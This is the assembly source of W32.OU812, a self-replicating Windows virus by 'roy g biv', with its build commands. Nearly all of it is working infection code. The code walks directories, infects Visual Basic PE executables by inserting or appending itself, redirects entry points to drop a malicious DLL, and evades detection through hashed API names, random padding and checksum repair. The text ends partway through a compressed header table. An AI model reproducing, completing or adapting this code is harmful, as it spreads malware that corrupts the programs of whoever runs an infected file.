
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[OU812.ASM]컴�
comment ;)
W32.OU812 by roy g biv

some of its features:
- parasitic direct action infector of VB5, VB6 PE exe (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- weird EPO (entry point is altered but no replication happens there)
- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are never altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC/SFP (including under Windows XP)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel address (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
- plus some new code optimisations that were never seen before W32.Shrug :)

yes, just a W32.Shrug remake that infects different type of host file
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 ou812
tlink32 /B:400000 /x ou812,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model  flat

extern  GetCurrentProcess:proc
extern  WriteProcessMemory:proc
extern  LoadLibraryA:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data

;must be reverse alphabetical order because they are stored on stack
;API names are not present in replications, only in dropper

krnnames        db      "UnmapViewOfFile"     , 0
                db      "SetFileTime"         , 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileAttributesA"  , 0
                db      "SetCurrentDirectoryW", 0
                db      "SetCurrentDirectoryA", 0
                db      "MultiByteToWideChar" , 0
                db      "MapViewOfFile"       , 0
                db      "LoadLibraryA"        , 0
                db      "GlobalFree"          , 0
                db      "GlobalAlloc"         , 0
                db      "GetVersion"          , 0
                db      "GetTickCount"        , 0
                db      "GetFullPathNameW"    , 0
                db      "GetFullPathNameA"    , 0
                db      "FindNextFileW"       , 0
                db      "FindNextFileA"       , 0
                db      "FindFirstFileW"      , 0
                db      "FindFirstFileA"      , 0
                db      "FindClose"           , 0
                db      "CreateFileW"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileA"         , 0
                db      "CloseHandle"         , 0

sfcnames        db      "SfcIsFileProtected", 0

dllnames        db      "WriteFile"          , 0
                db      "SetFileAttributesA" , 0
                db      "MoveFileA"          , 0
                db      "GlobalFree"         , 0
                db      "GlobalAlloc"        , 0
                db      "GetTickCount"       , 0
                db      "GetTempFileNameA"   , 0
                db      "GetSystemDirectoryA", 0
                db      "GetFileAttributesA" , 0
                db      "DeleteFileA"        , 0
                db      "CreateFileA"        , 0
                db      "CloseHandle"        , 0

dllname         equ     "vb6eng"                ;must be < 8 bytes long else code change

txttitle        db      "OU812", 0
txtbody         db      "running...", 0

include ou812.inc

.code
assume fs:nothing

dropper         label   near
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, dllcrc_count
        mov     ebx, offset dllnames
        mov     edi, offset dllcrcbegin
        call    create_crcs
        call    run_execode
        call    load_dllcode
        db      dllname, 0

load_dllcode    label   near
        call    LoadLibraryA
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess                     ;9x/Me does not send DLL_DETACH messages if ret here

create_crcs     proc    near
        imul    ebp, edx, 4

create_loop     label   near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        push    eax
        dec     edx
        jne     create_loop
        mov     eax, esp
        push    ecx
        push    ebp
        push    eax
        push    edi
        call    GetCurrentProcess
        push    eax
        xchg    esi, eax
        call    WriteProcessMemory
        add     esp, ebp
        ret
create_crcs     endp

run_execode     label   near
        mov     eax, esp
        xor     edi, edi
        push    edi
        push    4
        push    eax
        push    offset host_patch + 1
        push    esi
        call    WriteProcessMemory
        pop     eax
        jmp     ou812_execode
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here
;-----------------------------------------------------------------------------

ou812_dllcode   proc    near                    ;stack = DllHandle, Reason, Reserved
        mov     al, byte ptr [esp + initstk.initReason]
                                                ;set al nonzero
        test    al, DLL_PROCESS_ATTACH or DLL_THREAD_ATTACH
        jne     ou812_dllret                    ;kernel32 not in SEH chain on ATTACH messages
        pushad
        call    ou812_kernel
        mov     esp, dword ptr [esp + sehstruc.sehprevseh]
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad

ou812_dllret    label   near
        ret     0ch

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

ou812_kernel    proc    near
        xor     eax, eax
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp
        enter   (size findlist - 5) and -4, 0   ;Windows NT/2000/XP enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
        push    eax                             ;zero findprev in findlist
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset check_sfc - offset krncrcend + 4
        db      "OU812 - roy g biv"             ;the flavour-flavoured flavour

init_findmz     label   near
        xor     esi, esi
        lods    dword ptr fs:[esi]
        inc     eax

walk_seh        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     walk_seh
        mov     edi, dword ptr [esi]

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

check_sfc       label   near
        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows Me/2000
        push    esp
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        pop     ecx
        test    eax, eax
        je      sfcapi_push

found_sfc       label   near
        inc     eax
        xchg    edi, eax
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      0, 0
sfccrcend       label   near
        dd      offset sfcapi_pop - offset sfccrcend + 4

sfcapi_pop      label   near
        pop     eax

sfcapi_push     label   near
        push    eax

;-----------------------------------------------------------------------------
;swap CreateFileW and CreateFileMappingA because of alphabet order
;-----------------------------------------------------------------------------

        mov     ebx, esp
        mov     eax, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
        xchg    dword ptr [ebx + krncrcstk.kCreateFileW], eax
        mov     dword ptr [ebx + krncrcstk.kCreateFileMappingA], eax

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;so for Windows NT/2000/XP this code handles files that no ANSI function can open
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + krncrcstk.kGetVersion]
        shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
                                                ;safer than using AreFileApisANSI()
        lea     ebp, dword ptr [eax * 4 + ebx]
        lea     esi, dword ptr [ebx + size krncrcstk]

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;ANSI-compatible Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   find_next
        push    size findlist
        push    GMEM_FIXED
        call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        push    edi
        call    dword ptr [ebx + krncrcstk.kFindClose]

find_prev       label   near
        mov     ecx, dword ptr [esi + findlist.findprev]
        jecxz   ou812_exit
        push    esi
        mov     esi, ecx
        call    dword ptr [ebx + krncrcstk.kGlobalFree]

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        org     $ - 1                           ;select top 8 bits of push
ou812_exit      label   near
        int     3                               ;game over

        push    esp
        call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
        pop     eax
        jmp     find_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path and convert to Unicode if required (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx
        call    dword ptr [ebp + 8 + krncrcstk.kGetVersion]
        test    eax, eax
        jns     call_sfcapi
        mov     ecx, esp
        xchg    ebp, eax
        enter   MAX_PATH * 2, 0
        xchg    ebp, eax
        mov     eax, esp
        push    MAX_PATH
        push    eax
        inc     edi
        push    edi
        push    ecx
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        call    dword ptr [ebp + 8 + krncrcstk.kMultiByteToWideChar]

call_sfcapi     label   near

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

close_file      label   near                    ;label required for delta offset
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        sub     eax, 8
        push    eax
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
scan_dir        endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "06/06/01"                      ;welcome to the future
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;no .dll files this time
;-----------------------------------------------------------------------------

        test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret
        add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate
        lods    dword ptr [esi]
        xchg    ecx, eax

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], 0
        jne     inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        mov     edx, dword ptr [esi + pehdr.peimagebase - pehdr.pecodebase]
        lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        call    rva2raw
        mov     ecx, dword ptr [edi + ecx + 1]
        sub     ecx, edx
        call    rva2raw
        cmp     dword ptr [edi + ecx], '!5BV'
        jne     inftest_ret
        cmp     byte ptr [edi + ecx + 6], '*'
        jne     inftest_ret
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
        and     eax, RANDPADMAX - 1
        add     ax, small (offset ou812_codeend - offset ou812_dllcode + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        xor     ecx, ecx
        push    eax
        mov     edx, esp
        push    eax                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    ecx
        push    eax
        push    ecx
        push    PAGE_READWRITE
        push    ecx
        push    ebx
        call    dword ptr [edx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        push    eax
        xchg    edi, eax
        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        mov     esp, dword ptr [esp + sehstruc.sehprevseh]
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file in two parts
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to some code.  very simple
;               however, that code just drops dll and returns
;               other alteration is to store language dll name in VB header
;               dll contains virus code and is loaded by Visual Basic
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label     label   near
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        movzx   eax, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum]
        imul    eax, eax, size pesect
        movzx   ecx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        add     eax, ecx
        lea     esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset ou812_codeend - offset ou812_dllcode
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword ptr [esi]
        add     edi, edx
        push    esi
        mov     esi, offset ou812_dllcode - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehsehret]
                                                ;delta offset
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     esi

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

if ((offset ou812_codeend - offset dlllabel) and not 0ffh)
        error   ;dropper is too large
endif
        mov     cl, small (offset ou812_codeend - offset dlllabel)
        sub     edi, ecx
        add     eax, offset ou812_execode - offset ou812_dllcode
        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], eax
        mov     ecx, eax
        mov     edx, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        add     eax, edx
        mov     dword ptr [edi + offset host_patch - offset dlllabel + 1], eax
        xchg    edi, eax

;-----------------------------------------------------------------------------
;copy dll name, assumes name is 0ch bytes long
;-----------------------------------------------------------------------------

        pop     edi
        call    rva2raw
        mov     ecx, dword ptr [edi + ecx + 1]
        sub     ecx, edx
        call    rva2raw
        xchg    esi, eax
        lea     eax, dword ptr [edi + ecx + 6]
        xchg    edi, eax
        xor     ecx, ecx
        mov     byte ptr [edi], cl
        add     edi, 0eh
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        cdq
        xchg    edi, eax
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     dx, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop         label   near
        sub     esi, size pesect
        cmp     al, 'R'                         ;mask PUSH ESI
        org     $ - 1
rva2raw         proc    near                    ;ecx = RVA, esi -> last section header
        push    esi
        cmp     dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        add     ecx, dword ptr [esi]
        pop     esi
        ret
rva2raw        endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

ou812_execode   proc    near
host_patch      label   near
        push    '!bgr'
        pushad
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (dllcrc_count + 1) dup (0)
dllcrcend       label   near
        dd      offset drop_dll - offset dllcrcend + 4

dlllabel        label   near
        db      dllname, ".dll"
        db      0ch - (offset $ - offset dlllabel) dup (0)

dllsize equ     0bch
;RLE-based compressed MZ header, PE header, section table, relocation table
        dd      10110101100001011100000101110010b
        ;       mr   0ammz   02mmmz   01r   0cm
        db      'M', 'Z', 'P', 'E', 4ch, 1, 1, 70h
        dd      00000111110111101100001001010010b
        ;       z   01mmmmr   0emmz   02r   04m
        db      2, 21h, 0bh, 1, dllsize, 10h, 0ch
        dd      00100010000111000010011000000010b
        ;       z   08mz   03mz   02r   08z   02
        db      10h, 2
        dd      01011000000110000101000011011111b
        ;       r   06z   01mz   02mz   03r   0f
        db      ((offset ou812_codeend - offset ou812_dllcode + dllsize + 1fffh) and not 0fffh) shr 8, dllsize
        dd      01110110001110101000011110001101b
        ;       r   0dmz   07r   04z   0fz   06m
        db      6, 10h
        dd      00001110000101000011100001110001b
        ;       z   03mz   02mz   03mz   03mz  04
        db      ((offset ou812_codeend - offset ou812_dllcode + dllsize + 1ffh) and not 1ffh) shr 8, 1, 0ach, 8
        dd      00011010000000000000000000000000b
        ;       z   06m
        db      60h
        dd      0
;decompressed data follow.  'X' bytes are set to random value every time
;       db      'M', 'Z'                ;00
;       db      X, X                    ;02    align 4
;       db      X, X, X, X, X, X, X, X  ;04    useless filler
;       db      'P', 'E', 0, 0          ;0c 00 signature
;       dw      14ch                    ;10 04 machine
;       dw      1                       ;12 06 number of sections
;       db      X, X, X, X              ;14 08 date/time stamp
;       db      X, X, X, X              ;18 0c pointer to symbol table
;       db      X, X, X, X              ;1c 10 number of symbols
;       dw      70h                     ;20 14 size of optional header
;       dw      2102h                   ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       db      X                       ;26 1a major linker
;       db      X                       ;27 1b minor linker
;       db      X, X, X, X              ;28 1c size of code
;       db      X, X, X, X              ;2c 20 size of init data
;       db      X, X, X, X              ;30 24 size of uninit data
;       dd      dllsize + 1000h         ;34 28 entry point
;       db      X, X, X, X              ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      0                       ;40 34 image base
;       dd      1000h                   ;44 38 section align
;       dd      200h                    ;48 3c file align
;       db      X, X                    ;4c 40 major os
;       db      X, X                    ;4e 42 minor os
;       db      X, X                    ;50 44 major image
;       db      X, X                    ;52 46 minor image
;       dw      0                       ;54 48 major subsys
;       db      X, X                    ;56 4a minor subsys
;       db      X, X, X, X              ;58 4c reserved
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      dllsize                 ;60 54 size of headers
;       dd      X, X, X, X              ;64 58 checksum
;       db      X, X                    ;68 5c subsystem
